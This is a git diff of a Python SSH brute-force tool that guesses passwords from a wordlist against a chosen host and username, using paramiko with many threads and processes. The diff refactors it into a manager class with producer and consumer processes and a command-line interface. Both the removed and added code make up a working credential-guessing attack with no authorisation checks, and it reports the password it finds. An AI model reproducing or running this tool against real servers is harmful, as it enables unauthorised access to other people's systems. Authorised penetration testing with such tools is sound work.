@@ -1,269 +1,270 @@
 import argparse
 import multiprocessing
+# from multiprocessing.queues 
+# import multiprocessing.queues
 import paramiko
 from time import sleep
 import threading
 from termcolor import cprint
+import queue
 import sys
+from typing import List 
 
-# Log to file for debugging
+from sshbruteforce import *
+from producer import *
+from consumer import *
+import queuecontent
+
 error_file = open("brute-ssh.log", "w")
-sys.stderr = error_file
 
-class Result:
+class SSHBruteForceManager:
+ 
     """
-    Base class for handling SSH login results.
+    A class for managing an ssh brute force, automatically
+    implements multiprocessed PasswordProducer, and PasswordResultConsumer
+    for increase performance.
 
     Attributes:
-        message (str): The message describing the result.
-    """
-    def __init__(self, message=None):
-        if not message:
-            message = "None"
-        self.message = message
-
-class AuthenticationSuccess(Result):
-    """Class to represent a successful authentication result."""
-    pass
-
-class AuthenticationFailed(Result):
-    """Class to represent a failed authentication result."""
-    pass
-
-class SSHError(Result):
-    """Class to represent an SSH error result."""
-    pass
-
-class SSHLoginResult:
-    """
-    Represents the result of an SSH login attempt.
-
-    Attributes:
-        identifier (int): The identifier for the login attempt (thread ID).
-        result (Result): The result of the authentication attempt.
-    """
-    def __init__(self, identifier, result: Result = None):
-        self.identifier = identifier
-        self.result = result if result else Result()
-
-class SSHTarget:
-    """
-    Represents the target SSH server details.
-
-    Attributes:
-        hostname (str): The hostname or IP address of the SSH server.
-        port (int): The port number for SSH (default is 22).
-        username (str): The username for SSH login.
-    """
-    def __init__(self, hostname: str = "localhost", port: int = 22, username: str = None):
-        self.hostname = hostname
-        self.port = port
-        self.username = username
-
-class SSHBruteForce:
-    """
-    Handles the SSH brute-force attack logic.
-
-    Attributes:
-        target (SSHTarget): The target SSH server details.
-        passlist_filename (str): The filename containing the list of passwords.
-        passwords_queue (multiprocessing.Queue): Queue for managing passwords.
-        result_queue (multiprocessing.Queue): Queue for managing login results.
-        running_threads (list): List of currently running threads.
-        available_thread_ids (multiprocessing.Queue): Queue for available thread IDs.
-        shared_password_found (multiprocessing.Value): Shared state indicating if a password was found.
-    """
-    def __init__(self, target: SSHTarget, passlist_filename: str):
-        self.target = target
-        self.passlist_filename = passlist_filename
-
-        self.passwords_queue: multiprocessing.Queue[str] = multiprocessing.Queue(maxsize=50)
-        self.result_queue: multiprocessing.Queue[SSHLoginResult] = multiprocessing.Queue(maxsize=50)
-        self.running_threads: list = []  # List of thread info, including id and thread object
-        self.available_thread_ids: multiprocessing.Queue[int] = multiprocessing.Queue()
-        self.shared_password_found = multiprocessing.Value('b', False)  # Shared state for found password
-
-    def start(self, nonblocking: bool = False, thread_n: int = 1) -> bool:
-        """
-        Starts the brute-force process.
-
-        Args:
-            nonblocking (bool): If True, runs the brute-forcer in a separate thread.
-            thread_n (int): The number of threads to use for brute-forcing.
-
-        Returns:
-            bool: True if started successfully.
-        """
-        self.start_password_producer()
-        self.start_password_result_consumer()
-
-        if nonblocking:
-            self.main_thread = threading.Thread(target=self.bruteforcer, args=(thread_n,))
-            self.main_thread.start()
-            print("Started bruteforcer")
-            return True
+        target (SSHTarget): contains hostname, port, username.
+        passlist_filename (str): filepath of the password list.
         
-        self.bruteforcer(thread_n)
-        return True
+        passwords_queue (multiprocessing.Queue): Populated with passwords by PasswordProducer
+        results_queue (multiprocessing.Queue): Populated with results by SSHBruteForcers
 
-    def multiproccesed_bruteforce(self, process_n, thread_n):
+        passsword_failed_n (int): Represents the number of failed password attempts (excluding login errors)    
+    """
+
+    def __init__(self, target: SSHTarget, passlist_filename: str):
+        self.target = target # Our target ssh server
+        self.passlist_filename = passlist_filename # Our filepath that contains the password (one password at a line)
+
+        self.passwords_queue: multiprocessing.Queue = multiprocessing.Queue() # Queue for the passwords produced by PasswordProducer
+        self.results_queue: multiprocessing.Queue = multiprocessing.Queue() # Queue for the results of the bruteforce
+
+        self.running_bruteforce_proc: List[multiprocessing.Process] = [] # Will contain the bruteforcer process (only if multiprocessed bruteforce)
+        self.password_failed_n: int = 0 # Counts the number of failed password attempts ( for printing purposes )
+
+
+    def success_result_callback(self, queuedata) -> queuecontent.Signal:
         """
-        Starts multiple processes for brute-forcing.
+        This method is passed to the PasswordResultConsumer
+        to be used as a callback if a success signal is recieved.
+        
+        args:
+            queuedata (queuecontent.QueueData): Contains the signal and the password recieved.
 
-        Args:
-            process_n (int): Number of processes to start.
-            thread_n (int): Number of threads for each process.
+        returns:
+            queuecontent.Signal: A signal is returned to command the PasswordResultConsumer if needed.
+
         """
-        self.start_password_producer()
-        self.start_password_result_consumer()
-        for _ in range(process_n):
-            bruteforce = multiprocessing.Process(target=self.bruteforcer, args=(thread_n,))
-            bruteforce.start()
-
-    def bruteforcer(self, thread_n: int):
+        cprint(f"\n[+] Found the password {queuedata.content}", "green", attrs=["bold"])
+        return queuecontent.Signal.Finished
+        
+    def failed_result_callback(self, queuedata) -> queuecontent.Signal:
         """
-        The core brute-force logic that attempts to log in with multiple passwords.
+        This method is passed to the PasswordResultConsumer
+        to be used as a callback if a failed signal is recieved.
+        
+        args:
+            queuedata (queuecontent.QueueData): Contains the signal and the password recieved.
 
-        Args:
-            thread_n (int): The number of threads to use for brute-forcing.
+        returns:
+            queuecontent.Signal: A signal is returned to command the PasswordResultConsumer if needed.
         """
-        for id in range(thread_n):
-            self.available_thread_ids.put(id)
+        cprint(f"[{self.password_failed_n}] not the password {queuedata.content}", "red")
+        self.password_failed_n += 1
+        return queuecontent.Signal.Blank
 
-        while True:
-            with self.shared_password_found.get_lock():
-                if self.shared_password_found.value:
-                    cprint("[+] Password found, exiting..", "cyan", attrs=["bold"])
-                    self.clean_process()
-                    return
+    def start_password_producer(self) -> None:
+        """
+        Creates a PasswordProducer and runs it as a seperate process.
+        """
+        self.password_producer = PasswordProducer(
+            self.passlist_filename,
+            self.passwords_queue,
+        )
+        self._password_producer_proc = multiprocessing.Process(
+            target=self.password_producer.produce
+        )
+        self._password_producer_proc.start()
 
-            if self.passwords_queue.empty():
-                continue
+    def start_password_result_consumer(self) -> None:
+        """
+        Creates a PasswordConsumer instance stored as property for later use,
+        and autoatically runs it as a seperate process
+        """
 
-            thread_id = self.available_thread_ids.get()
-            password = self.passwords_queue.get()
-
-            if password is None:  # Sentinel to stop processing
-                self.wait_for_threads()
-                cprint("No more passwords to process.", "cyan")
-                self.clean_process()
-                return
-
-            # Start a thread to attempt the SSH login with the obtained password
-            login_thread = threading.Thread(target=self.ssh_login, daemon=True, args=(thread_id, self.target, password))
-            login_thread.start()
-            self.running_threads.append({'id': thread_id, 'thread': login_thread})
-
-    def start_password_producer(self):
-        """Starts a separate process to produce passwords from the file."""
-        self._password_generator_proc = multiprocessing.Process(target=self.password_producer)
-        self._password_generator_proc.start()
-
-    def start_password_result_consumer(self):
-        """Starts a separate process to consume login results."""
-        self._password_result_consumer_proc = multiprocessing.Process(target=self.password_result_consumer)
+        self.password_result_consumer = PasswordConsumer(
+            self.results_queue,
+            self.passwords_queue,
+            success_callback=self.success_result_callback,
+            failed_callback=self.failed_result_callback
+        )
+        self._password_result_consumer_proc = multiprocessing.Process(
+            target=self.password_result_consumer.consume
+        )
         self._password_result_consumer_proc.start()
 
-    def ssh_login(self, thread_id: int, target: SSHTarget, password: str, max_tries: int = 10):
+    def start(
+            self, 
+            login_thread_n_each: int = 0, 
+            process_n:int=0
+        ) -> None:
         """
-        Attempts to login to the SSH server using the provided credentials.
+        Initiates the PasswordProducer and the PasswordResultConsumer,
+        runs the appropriate bruteforcer configuration/setup, and 
+        cleans/stops the PasswordProducer and the PasswordResultConsumer
+        after bruteforcers are finished.
 
-        Args:
-            thread_id (int): The ID of the thread attempting the login.
-            target (SSHTarget): The target SSH server details.
-            password (str): The password to attempt.
-            max_tries (int): The maximum number of attempts for this password.
+        args:
+            login_thread_n_each (int): How many threads per process
+            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
         """
-        result = None
-        tries = 0
+        self.start_password_producer()
+        self.start_password_result_consumer()
+        self.run_bruteforcers(
+            login_thread_n_each,
+            process_n
+        )
+        cprint(
+            f"[SSHBruteForceManager]: Stopping password_producer and result_consumer", 
+            "yellow", 
+            attrs=["bold"]
+        )
 
-        while tries < max_tries:
-            try:
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(
-                    hostname=target.hostname,
-                    port=target.port,
-                    username=target.username,
-                    password=password,
-                    timeout=10  # Set a reasonable timeout for connections
-                )
-                result = AuthenticationSuccess(password)
-                break  # Stop retrying if connection succeeds
-            except paramiko.ssh_exception.AuthenticationException:
-                result = AuthenticationFailed(password)
-                break
-            except paramiko.ssh_exception.SSHException as ssh_error:
-                tries += 1
-                if tries >= max_tries:
-                    result = SSHError(password)
-                    break
-            finally:
-                if 'client' in locals():
-                    client.close()
+        self.password_producer.stop()
+        self._password_producer_proc.kill()
+        self.password_result_consumer.stop()
+        self._password_result_consumer_proc.kill()
         
-        self.result_queue.put(SSHLoginResult(thread_id, result))
-        self.release_thread_id(thread_id)
 
-    def password_producer(self):
-        """Reads passwords from a file and adds them to the password queue."""
-        with open(self.passlist_filename, 'r') as passfile:
-            for password_count, line in enumerate(passfile):
-                password = line.strip()
-                if password:  # Avoid empty lines
-                    self.passwords_queue.put(password)
-        self.passwords_queue.put(None)  # Add sentinel to signal end
-
-    def password_result_consumer(self):
-        """Processes results from login attempts and handles outcomes."""
-        password_tried = 0
-        while True:
-            if not self.result_queue.empty():
-                login: SSHLoginResult = self.result_queue.get()
-                if isinstance(login.result, AuthenticationSuccess):
-                    cprint(f"\nFound password: {login.result.message}\n", "green", attrs=["bold"])
-                    with self.shared_password_found.get_lock():
-                        self.shared_password_found.value = True
-                    break
-                elif isinstance(login.result, AuthenticationFailed):
-                    password_tried += 1
-                    cprint(f"[{password_tried}] not {login.result.message}", "red")
-                elif isinstance(login.result, SSHError):
-                    cprint(f"SSH Error with {login.result.message}, retrying", "red")
-                    self.passwords_queue.put(login.result.message)  # Retry SSH errors
-
-    def release_thread_id(self, thread_id: int):
+    def run_bruteforcers(
+            self, 
+            login_thread_n_each: int = 0, 
+            process_n:int=0
+        ) -> None:
         """
-        Releases the thread ID back to the pool of available IDs.
+        Determines if it should run single or multi processed
+        bruteforcer depending on the given process_n
 
-        Args:
-            thread_id (int): The ID of the thread to be released.
+        args:
+            login_thread_n_each (int): How many threads per process
+            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
         """
-        self.running_threads = [x for x in self.running_threads if x['id'] != thread_id]
-        self.available_thread_ids.put(thread_id)
 
-    def wait_for_threads(self):
-        """Waits for all running threads to finish."""
-        for thread_info in self.running_threads:
-            thread_info['thread'].join()
+        if process_n > 0:
+            self.run_multiprocessed_bruteforcers(
+                login_thread_n_each,
+                process_n
+            )
+        else:
+            self.run_single_bruteforcer(
+                login_thread_n_each
+            )
+        
 
-    def clean_process(self):
-        """Terminates the password producer and consumer processes."""
-        self._password_generator_proc.terminate()
-        self._password_result_consumer_proc.terminate()
-        exit()
+
+    def run_multiprocessed_bruteforcers(
+            self, 
+            login_thread_n_each: int = 0, 
+            process_n:int=0
+        ) -> None:
+        """
+        Creates the bruteforcers and runs it as a seperate process (multiprocessed).
+
+        args:
+            login_thread_n_each (int): How many threads per process
+            process_n (int): How many processes to spawn ( if 0, will used the current process for bruteforce )
+        """
+        if process_n > 0:
+            for _ in range(process_n):
+
+                brute_forcer: SSHBruteForcer = self.create_bruteforcer(
+                    login_thread_n=login_thread_n_each
+                )
+                brute_forcer_proc = brute_forcer.multiprocessed_run()
+                self.running_bruteforce_proc.append(brute_forcer_proc)
+
+        self.wait_for_bruteforcer_procs()
+
+    def run_single_bruteforcer(
+            self, 
+            login_thread_n_each: int = 0, 
+        ) -> None:
+        """
+        Creates and runs the bruteforcer without multiprocessing it,
+        but number of threads specified will still apply
+        
+        args:
+            login_thread_n_each (int): How many threads to run
+        """
+        brute_forcer: SSHBruteForcer = self.create_bruteforcer(
+            login_thread_n=login_thread_n_each
+        )
+        brute_forcer.run()
+        
+
+    def create_bruteforcer(self, login_thread_n=0) -> SSHBruteForcer:
+        """
+        Creates a default preconfigured bruteforcer, that
+        will be used regardless if singled or multi processed
+
+        args:
+            login_thread_n_each (int): How many threads to run
+        """
+
+        return SSHBruteForcer(
+                    target=self.target,
+                    passwords_queue=self.passwords_queue,
+                    results_queue=self.results_queue,
+                    login_thread_n=login_thread_n,
+        )
+    
+    def wait_for_bruteforcer_procs(self) -> None:
+        """Simply waits for the bruteforce processes to finish."""
+
+        for bruteforcer_proc in self.running_bruteforce_proc:
+            bruteforcer_proc.join()
 
 if __name__ == '__main__':
     # Command line argument parsing
     parser = argparse.ArgumentParser(description="SSH Brute Force Tester")
-    parser.add_argument("password_file", help="File containing list of passwords")
-    parser.add_argument("hostname", help="Hostname or IP of the SSH server")
-    parser.add_argument("username", help="Username for SSH login")
-    parser.add_argument("--port", type=int, default=22, help="SSH port (default is 22)")
+    parser.add_argument("hostname", default="localhost", help="Hostname or IP of the SSH server")
+    parser.add_argument("--username", "-u",help="Username for SSH login")
+    parser.add_argument("--passlist", "-P", help="File containing list of passwords")
+    parser.add_argument("--threads", "-t", type=int, default=10, help="Amount of threads per process")
+    parser.add_argument("--processes", "--procs", type=int, default=0, help="Amount of processes")
+    parser.add_argument("--port", "-p", type=int, default=22, help="SSH port (default is 22)")
+    parser.add_argument("--debug", "-d", choices=["True", "False"], default="False", help="enable error outputs")
+
     args = parser.parse_args()
+    sys.stderr = sys.stderr if str(args.debug).capitalize() == "True" else error_file
+    process_n: int = int(args.processes if args.processes else 0)
+    thread_n: int = int(args.threads if args.threads else 0)
+    hostname: str = args.hostname
+    port: int = int(args.port)
+    username: str = args.username
+    passlist: str = args.passlist
+
+    cprint(f"[*] Starting SSH Bruteforce Session", "blue", attrs=["bold"])
+    cprint(f"[*] Target: {username}@{hostname}:{port}", "blue")
+    cprint(f"[*] Processes: {process_n}", "blue") if process_n else None
+    cprint(f"[*] {'Threads each process' if process_n > 0 else 'Threads'}: {thread_n}", "blue")
+    cprint(f"[*] Total threads: {thread_n * process_n if process_n > 0 else thread_n}", "blue") if process_n > 0 else None
+    print("")
 
     # Create SSH target and initiate brute force
-    target = SSHTarget(hostname=args.hostname, port=args.port, username=args.username)
-    brute_forcer = SSHBruteForce(target, args.password_file)
-    brute_forcer.multiproccesed_bruteforce(5, 100)  # Start brute-forcing with specified process and thread counts
-    print("DONE")
+    target = SSHTarget(
+        hostname=hostname, 
+        port=port, 
+        username=username
+    )
+    brute_forcer = SSHBruteForceManager(
+        target, 
+        passlist
+    )
+    brute_forcer.start(
+        process_n=process_n ,
+        login_thread_n_each=thread_n,
+    )
+    cprint("[*] Finished", "blue", attrs=["bold"])
